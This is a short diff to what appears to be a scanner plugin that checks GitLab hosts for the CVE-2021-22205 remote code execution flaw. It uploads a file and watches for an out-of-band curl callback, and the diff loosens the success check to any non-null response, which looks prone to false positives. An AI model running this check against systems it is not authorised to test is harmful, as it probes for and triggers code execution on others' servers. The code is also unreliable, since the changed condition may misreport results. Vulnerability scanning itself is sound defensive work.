@@ -34,6 +34,6 @@ class Plugin(BasePlugin):
         rev_token = reverse.request_code('headers["User-Agent"].contains("curl")')
         session.post(f'{target}/uploads/user', files=file, headers={"X-CSRF-Token": csrf})
         rev_resp = reverse.check(rev_token)
-        if rev_resp["requested"]:
+        if rev_resp is not None:
             self.logger.success("CVE-2021-22205 {}".format(target))
             return "Gitlab rce https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md"
